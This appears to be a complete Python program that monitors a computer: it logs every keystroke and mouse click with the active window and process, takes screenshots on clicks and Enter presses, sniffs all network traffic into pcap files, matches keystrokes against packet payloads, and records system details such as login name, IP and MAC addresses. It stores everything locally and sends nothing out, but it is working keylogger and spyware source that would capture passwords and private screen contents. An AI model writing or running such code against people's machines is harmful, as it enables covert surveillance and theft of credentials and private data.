import logging
import os
import sys
import time
import threading
import multiprocessing
import platform
import socket
import subprocess
import psutil
import string
import re
from datetime import datetime
import mss
from pynput import mouse, keyboard
from scapy.all import sniff, wrpcap, rdpcap
from scapy.layers.inet import TCP
from io import StringIO

os.makedirs('Logs', exist_ok=True)
os.makedirs('Screen Captures', exist_ok=True)
os.makedirs('Packets', exist_ok=True)

current_datetime = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
os_name = sys.platform
if os_name == "darwin":
    os_name = "macOS"
elif os_name == "win32":
    os_name = "Windows"
elif os_name.startswith("linux"):
    os_name = "Linux"

log_file_path = f'Logs/{os_name}_{current_datetime}.log'

def gather_system_info():
    info = ["System Information:"]
    info.append(f"Operating System: {platform.system()} {platform.release()} {platform.version()}")
    info.append(f"Architecture: {platform.machine()}")
    info.append(f"Processor: {platform.processor()}")
    info.append(f"CPU Frequency: {psutil.cpu_freq().current if psutil.cpu_freq() else 'N/A'} MHz")
    info.append(f"Physical cores: {psutil.cpu_count(logical=False)}")
    info.append(f"Total cores: {psutil.cpu_count(logical=True)}")
    info.append(f"RAM: {psutil.virtual_memory().total / (1024 ** 3):.2f} GB")
    info.append(f"Login Name: {os.getlogin()}")

    warned_interfaces = set()
    for interface, addrs in psutil.net_if_addrs().items():
        has_ipv4 = False
        for addr in addrs:
            if addr.family == socket.AF_INET:
                info.append(f"IP Address ({interface}): {addr.address}")
                has_ipv4 = True
                break
            elif addr.family == psutil.AF_LINK:
                info.append(f"MAC Address ({interface}): {addr.address}")
        if not has_ipv4 and interface not in warned_interfaces:
            info.append(f"WARNING: No IPv4 address found on {interface} !")
            warned_interfaces.add(interface)

    for partition in psutil.disk_partitions():
        info.append(f"Mounted drive: {partition.device} mounted on {partition.mountpoint} with fstype {partition.fstype}")

    return '\n'.join(info)

def setup_logging():
    logging.basicConfig(filename=log_file_path, level=logging.INFO, format='%(asctime)s - %(message)s')

    with open(log_file_path, 'a') as log_file:
        log_file.write("System Information:\n")
        log_file.write(gather_system_info() + '\n')
        log_file.write("------------------------\n")

def get_window_info():
    try:
        if os_name == "macOS":
            from AppKit import NSWorkspace
            from Quartz import (
                CGWindowListCopyWindowInfo,
                kCGWindowListOptionOnScreenOnly,
                kCGNullWindowID
            )

            curr_app = NSWorkspace.sharedWorkspace().frontmostApplication()
            curr_pid = NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationProcessIdentifier']
            curr_app_name = curr_app.localizedName()

            options = kCGWindowListOptionOnScreenOnly
            window_list = CGWindowListCopyWindowInfo(options, kCGNullWindowID)

            for window in window_list:
                pid = window['kCGWindowOwnerPID']
                window_title = window.get('kCGWindowName', u'Unknown')
                if curr_pid == pid:
                    process_name = psutil.Process(pid).name()
                    return f"{window_title} - {process_name}"

        elif os_name == "Windows":
            import win32gui

            window = win32gui.GetForegroundWindow()
            window_title = win32gui.GetWindowText(window)
            _, process_id = win32gui.GetWindowThreadProcessId(window)
            process_name = psutil.Process(process_id).name()

            return f"{window_title} - {process_name}"

        elif os_name == "Linux":
            import Xlib.display

            display = Xlib.display.Display()
            window = display.get_input_focus().focus
            window_class = window.get_wm_class()
            window_name = window.get_wm_name()

            process_id = window.get_pid()
            process_name = psutil.Process(process_id).name()

            return f"{window_name} - {process_name}"

    except Exception as e:
        logging.error(f"Error retrieving window information: {str(e)}")

    return "Not available"

def log_interaction(info):
    window_info = get_window_info()
    process_id = os.getpid()
    thread_name = threading.current_thread().name
    logging.info(f"[{process_id}/{thread_name}] {info} - Window Info: {window_info}")

def packet_capture_worker(stop_event, filename):
    packets = []
    def handle_packet(packet):
        packets.append(packet)
    try:
        sniff(prn=handle_packet, stop_filter=lambda x: stop_event.is_set())
        wrpcap(filename, packets)
    except Exception as e:
        logging.error(f"Failed to capture packets: {str(e)}")

def start_packet_capture(filename):
    stop_event = multiprocessing.Event()
    packet_process = multiprocessing.Process(target=packet_capture_worker, args=(stop_event, filename))
    packet_process.start()
    return stop_event, packet_process

def stop_packet_capture(stop_event, packet_process):
    stop_event.set()
    packet_process.join()

def sanitize_filename(filename):
    """
    Sanitize the filename by removing or replacing all invalid characters
    and ensuring the filename does not contain path traversal or other
    problematic patterns.
    """
    filename = re.sub(r'[\\/*?:"<>|]', "_", filename)  # Replace reserved characters Windows doesn't allow in filenames
    filename = re.sub(r'\s+', '_', filename)  # Replace all whitespace with underscore
    filename = ''.join(c for c in filename if c.isalnum() or c in "-_.()")
    return filename.strip("_")  # Remove any trailing underscores that might cause issues

def take_screenshot(action):
    directory = "Screen Captures"
    os.makedirs(directory, exist_ok=True)  # Ensure the directory exists
    with mss.mss() as sct:
        window_info = get_window_info()
        if ' - ' in window_info:
            window_title, process_name = window_info.split(' - ', 1)  # Split safely with maxsplit
        else:
            window_title = 'unknown'
            process_name = psutil.Process().name()

        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        sanitized_title = sanitize_filename(window_title)
        sanitized_process = sanitize_filename(process_name)
        filename = f"{directory}/{timestamp}_{sanitized_title}_{sanitized_process}.png"

        try:
            sct.shot(output=filename)
            log_interaction(f"Screenshot captured: {filename}")
        except Exception as e:
            logging.error(f"Failed to capture screenshot: {str(e)}")

def on_click(x, y, button, pressed):
    if pressed:
        action = f"Mouse clicked at ({x}, {y}) with button {button}"
        log_interaction(f"[Mouse Click] {action}")
        take_screenshot(action)

def on_press(key):
    try:
        action = f"Key pressed: {key}"
        log_interaction(f"[Keyboard Input] {action}")
        if key == keyboard.Key.enter:
            take_screenshot(action)

        # Check for related packet captures with exact line numbers
        related_packets = []
        pcap_file = f'Packets/{os_name}_{current_datetime}.pcap'
        if os.path.exists(pcap_file):
            packets = rdpcap(pcap_file)
            for i, pkt in enumerate(packets):
                if pkt.haslayer(TCP) and pkt[TCP].payload:
                    payload = pkt[TCP].payload.load.decode('utf-8', 'ignore')
                    if str(key) in payload:
                        related_packets.append((i + 1, payload))  # Store line number and payload

        if related_packets:
            interaction_details = ", ".join(f"Line {line}: {data}" for line, data in related_packets)
            log_interaction(f"[Keyboard Input] {action} - Related Packets: {interaction_details}")

    except Exception as e:
        logging.error(f"Error processing key press: {str(e)}")

def on_release(key):
    action = f"Key released: {key}"
    log_interaction(f"[Keyboard Release] {action}")

def main():
    setup_logging()
    gather_system_info()  # Call gather_system_info() without printing the result
    stop_event, packet_process = start_packet_capture(f'Packets/{os_name}_{current_datetime}.pcap')

    keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    mouse_listener = mouse.Listener(on_click=on_click)

    keyboard_listener.start()
    mouse_listener.start()

    try:
        logging.info("Script started. Press Ctrl+C to stop.")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logging.info("Script interrupted by user.")
    finally:
        keyboard_listener.stop()
        mouse_listener.stop()
        stop_packet_capture(stop_event, packet_process)
        logging.info("Script finished gracefully.")

if __name__ == "__main__":
    multiprocessing.freeze_support()
    main()
